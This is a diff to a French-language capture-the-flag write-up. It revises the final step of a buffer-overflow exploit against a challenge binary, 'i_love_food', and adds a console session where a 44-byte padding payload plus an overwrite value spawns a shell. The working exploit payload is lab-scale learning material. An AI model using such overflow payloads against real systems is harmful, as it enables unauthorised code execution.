@@ -140,9 +140,20 @@ Program received signal SIGSEGV, Segmentation fault.
 0x0000000000000000 in ?? ()
 ```
 
-On arrive bien au message de succès avant que le programme plante en essayant de lancer le shell.  
-  
-Le payload final est donc `"\x41"*44+"\x0d\xf0\x0d\xf0"`.
+On arrive bien au message de succès mais le programme plante en essayant de lancer le shell. Testons le payload directement sur le binaire :
+
+```console
+$ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*44+b"\x0d\xf0\x0d\xf0")' ; tee) | ./i_love_food  
+What is your favorite dish ? 
+
+Damn that's a good one !
+whoami
+coucou
+ls
+exploit.py  i_love_food  README.md
+```
+
+Le programme lance bien /bin/sh, le payload final est donc `"\x41"*44+"\x0d\xf0\x0d\xf0"`.
 
 ## Exploit
 
